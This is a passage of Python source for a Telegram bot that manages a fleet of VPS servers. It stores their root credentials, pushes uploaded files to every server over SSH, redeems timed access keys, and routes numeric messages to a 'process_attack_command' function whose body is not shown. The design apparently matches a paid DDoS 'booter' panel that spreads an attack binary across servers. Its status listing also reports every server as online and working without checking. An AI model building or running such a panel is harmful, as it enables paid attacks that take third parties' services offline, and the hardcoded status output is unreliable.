        'added_at': datetime.now().isoformat()
    }
    
    if save_vps_data(vps_data):
        bot.send_message(
            chat_id,
            f"*VPS {ip} added successfully!*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add VPS {ip}.*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove VPS" and is_owner(message.from_user.id))
def remove_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "🔒 *You don't have permission to remove VPS!*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    
    if not vps_data['vps']:
        bot.send_message(chat_id, "❌ *No VPS found to remove!*", parse_mode='Markdown')
        return
    
    vps_list = list(vps_data['vps'].items())
    response = "✨ *VPS Removal Panel* ✨\n"
    response += "╔════════════════════════════╗\n"
    response += "║  🗑️ *SELECT VPS TO REMOVE*  ║\n"
    response += "╚════════════════════════════╝\n\n"
    response += "🔢 *Available VPS Servers:*\n"
    
    for i, (ip, details) in enumerate(vps_list, 1):
        response += f"\n🔘 *{i}.*  🌐 `{ip}`\n"
        response += f"   👤 User: `{details['username']}`\n"
        response += f"   ⏳ Added: `{datetime.fromisoformat(details['added_at']).strftime('%d %b %Y')}`\n"
    
    response += "\n\n💡 *Enter the number* (1-{}) *or* ❌ *type '0' to cancel*".format(len(vps_list))
    
    msg = bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )
    
    bot.register_next_step_handler(msg, process_vps_removal_by_number, vps_list)

def process_vps_removal_by_number(message, vps_list):
    chat_id = message.chat.id
    user_id = message.from_user.id
    selection = message.text.strip()
    
    try:
        selection_num = int(selection)
        
        if selection_num == 0:
            bot.send_message(
                chat_id,
                "🚫 *VPS removal cancelled!*",
                reply_markup=get_vps_markup(),
                parse_mode='Markdown'
            )
            return
            
        if selection_num < 1 or selection_num > len(vps_list):
            raise ValueError("Invalid selection")
            
        selected_ip, selected_details = vps_list[selection_num - 1]
        
        confirm_msg = (
            f"⚠️ *CONFIRM VPS REMOVAL* ⚠️\n"
            f"┌──────────────────────────────┐\n"
            f"│  🖥️ *VPS #{selection_num} DETAILS*  │\n"
            f"├──────────────────────────────┤\n"
            f"│ 🌐 *IP:* `{selected_ip}`\n"
            f"│ 👤 *User:* `{selected_details['username']}`\n"
            f"│ 📅 *Added:* `{datetime.fromisoformat(selected_details['added_at']).strftime('%d %b %Y %H:%M')}`\n"
            f"└──────────────────────────────┘\n\n"
            f"❗ *This action cannot be undone!*\n\n"
            f"🔴 Type *'CONFIRM'* to proceed\n"
            f"🟢 Type anything else to cancel"
        )
        
        msg = bot.send_message(
            chat_id,
            confirm_msg,
            parse_mode='Markdown'
        )
        
        bot.register_next_step_handler(msg, confirm_vps_removal, selected_ip)
        
    except ValueError:
        bot.send_message(
            chat_id,
            f"❌ *Invalid selection!*\nPlease enter a number between 1-{len(vps_list)} or 0 to cancel.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

def confirm_vps_removal(message, ip_to_remove):
    chat_id = message.chat.id
    user_id = message.from_user.id
    confirmation = message.text.strip().upper()
    
    if confirmation == "CONFIRM":
        vps_data = load_vps_data()
        
        if ip_to_remove in vps_data['vps']:
            del vps_data['vps'][ip_to_remove]
            
            if save_vps_data(vps_data):
                bot.send_message(
                    chat_id,
                    f"✅ *SUCCESS!*\n\n🖥️ VPS `{ip_to_remove}` has been *permanently removed*!",
                    reply_markup=get_vps_markup(),
                    parse_mode='Markdown'
                )
            else:
                bot.send_message(
                    chat_id,
                    f"❌ *FAILED!*\n\nCould not remove VPS `{ip_to_remove}`. Please try again.",
                    reply_markup=get_vps_markup(),
                    parse_mode='Markdown'
                )
        else:
            bot.send_message(
                chat_id,
                f"🤔 *NOT FOUND!*\n\nVPS `{ip_to_remove}` doesn't exist in the system.",
                reply_markup=get_vps_markup(),
                parse_mode='Markdown'
            )
    else:
        bot.send_message(
            chat_id,
            "🟢 *Operation cancelled!*\n\nNo VPS were removed.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List VPS" and is_owner(message.from_user.id))
def list_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to list VPS.*", parse_mode='Markdown')
        return
    
    vps_data = load_vps_data()
    
    if not vps_data['vps']:
        bot.send_message(chat_id, "*No VPS found!*", parse_mode='Markdown')
        return
    
    vps_status = {}
    for ip in vps_data['vps']:
        vps_status[ip] = {
            'status': "🟢 Online",
            'binary': "✔ Binary working"
        }
    
    online_count = sum(1 for ip in vps_status if vps_status[ip]['status'] == "🟢 Online")
    offline_count = len(vps_status) - online_count
    
    response = (
        "╔══════════════════════════╗\n"
        "║     🖥️ VPS STATUS       ║\n"
        "╠══════════════════════════╣\n"
        f"║ Online: {online_count:<15} ║\n"
        f"║ Offline: {offline_count:<14} ║\n"
        f"║ Total: {len(vps_status):<16} ║\n"
        "╚══════════════════════════╝\n\n"
        f"Bot Owner: @{message.from_user.username or 'admin'}\n\n"
    )
    
    for i, (ip, details) in enumerate(vps_data['vps'].items(), 1):
        status_info = vps_status.get(ip, {'status': '🔴 Unknown', 'binary': '✖ Status unknown'})
        
        response += (
            f"╔══════════════════════════╗\n"
            f"║ VPS {i} Status{' '*(16-len(str(i)))}║\n"
            f"╠══════════════════════════╣\n"
            f"║ {status_info['status']:<24} ║\n"
            f"║ IP: {ip:<20} ║\n"
            f"║ User: {details['username']:<18} ║\n"
            f"║ {status_info['binary']:<24} ║\n"
            f"╚══════════════════════════╝\n\n"
        )
    
    bot.send_message(
        chat_id,
        f"```\n{response}\n```",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "📁 VPS Files" and is_owner(message.from_user.id))
def vps_files_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for VPS files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*VPS File Management*",
        reply_markup=get_vps_files_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "📤 Upload to All" and is_owner(message.from_user.id))
def upload_to_all_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to upload files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the file you want to upload to all VPS:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_file_upload)

def process_file_upload(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not message.document:
        bot.send_message(
            chat_id,
            "*Please send a file to upload.*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        local_path = os.path.join(BASE_DIR, message.document.file_name)
        with open(local_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        vps_data = load_vps_data()
        success_count = 0
        failed_count = 0
        
        bot.send_message(chat_id, "*Starting file upload to all VPS...*", parse_mode='Markdown')
        
        for ip, details in vps_data['vps'].items():
            remote_path = f"/root/{message.document.file_name}"
            success, result = ssh_upload_file(
                ip, 
                details['username'], 
                details['password'], 
                local_path, 
                remote_path
            )
            
            if success:
                success_count += 1
            else:
                failed_count += 1
                logger.error(f"Failed to upload to {ip}: {result}")
        
        os.remove(local_path)
        
        bot.send_message(
            chat_id,
            f"*File upload completed!*\n\n"
            f"Success: {success_count}\n"
            f"Failed: {failed_count}",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Error in file upload: {e}")
        bot.send_message(
            chat_id,
            f"*An error occurred during file upload: {str(e)}*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove from All" and is_owner(message.from_user.id))
def remove_from_all_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Enter the filename to remove from all VPS:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_file_removal)

def process_file_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    filename = message.text.strip()
    
    vps_data = load_vps_data()
    success_count = 0
    failed_count = 0
    
    bot.send_message(chat_id, "*Starting file removal from all VPS...*", parse_mode='Markdown')
    
    for ip, details in vps_data['vps'].items():
        remote_path = f"/root/{filename}"
        success, result = ssh_remove_file(
            ip,
            details['username'],
            details['password'],
            remote_path
        )
        
        if success:
            success_count += 1
        else:
            failed_count += 1
            logger.error(f"Failed to remove from {ip}: {result}")
    
    bot.send_message(
        chat_id,
        f"*File removal completed!*\n\n"
        f"Success: {success_count}\n"
        f"Failed: {failed_count}",
        reply_markup=get_vps_files_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "📂 List Files" and is_owner(message.from_user.id))
def list_files_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to list files.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Enter VPS IP to list files from:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_file_listing)

def process_file_listing(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    ip = message.text.strip()
    
    vps_data = load_vps_data()
    
    if ip not in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"*VPS {ip} not found!*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
        return
    
    details = vps_data['vps'][ip]
    success, files = ssh_list_files(
        ip,
        details['username'],
        details['password'],
        "/root"
    )
    
    if success:
        response = f"*Files on {ip}:*\n\n" + "\n".join(f"{f}" for f in files)
        bot.send_message(
            chat_id,
            response,
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to list files: {files[0]}*",
            reply_markup=get_vps_files_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "👑 Owner Tools" and is_owner(message.from_user.id))
def owner_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for owner tools.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Owner Tools*",
        reply_markup=get_owner_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add Owner" and is_owner(message.from_user.id))
def add_owner_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to add owners.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to add as owner:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_owner_addition)

def process_owner_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_owner = message.text.strip()
    
    try:
        new_owner_id = int(new_owner)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    owner_data = load_owner_data()
    
    if new_owner_id in owner_data['owners']:
        bot.send_message(
            chat_id,
            f"*User {new_owner_id} is already an owner!*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )
        return
    
    owner_data['owners'].append(new_owner_id)
    
    if save_owner_data(owner_data):
        bot.send_message(
            chat_id,
            f"*User {new_owner_id} added as owner successfully!*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add owner {new_owner_id}.*",
            reply_markup=get_owner_markup(),
            parse_mode='Markdown'
        )

def redeem_key(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    key = message.text.strip()
    
    keys = load_keys()
    
    if key not in keys:
        bot.send_message(chat_id, "*Invalid key!*", parse_mode='Markdown')
        return
    
    if keys[key]['redeemed']:
        bot.send_message(chat_id, "*Key already redeemed!*", parse_mode='Markdown')
        return
    
    duration = keys[key]['duration']
    if duration == 'hour':
        expires = datetime.now() + timedelta(hours=1)
    elif duration == 'day':
        expires = datetime.now() + timedelta(days=1)
    elif duration == 'week':
        expires = datetime.now() + timedelta(weeks=1)
    else:
        expires = datetime.now()
    
    users = load_users()
    user_exists = any(u['user_id'] == user_id for u in users)
    
    if user_exists:
        for user in users:
            if user['user_id'] == user_id:
                user['key'] = key
                user['valid_until'] = expires.isoformat()
                break
    else:
        users.append({
            'user_id': user_id,
            'key': key,
            'valid_until': expires.isoformat()
        })
    
    keys[key]['redeemed'] = True
    keys[key]['redeemed_by'] = user_id
    keys[key]['redeemed_at'] = datetime.now().isoformat()
    
    if save_users(users) and save_keys(keys):
        bot.send_message(
            chat_id,
            f"*Key redeemed successfully!*\n\n"
            f"Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')}",
            reply_markup=get_main_markup(user_id),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(chat_id, "*Error saving data. Please try again.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_text_messages(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    text = message.text.strip()
    
    if any(part.isdigit() for part in text.split()):
        process_attack_command(message, chat_id)
        return
    
    if len(text) == 16 and text.isalnum():
        redeem_key(message)
        return
    
    bot.send_message(
        chat_id,
        "*Unknown command. Please use the buttons.*",
        reply_markup=get_main_markup(user_id),
        parse_mode='Markdown'
    )

# Start the bot
if __name__ == '__main__':
    logger.info("Starting bot...")
    keys = load_keys()
    
    try:
        bot.infinity_polling(none_stop=True, interval=1)
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        time.sleep(5)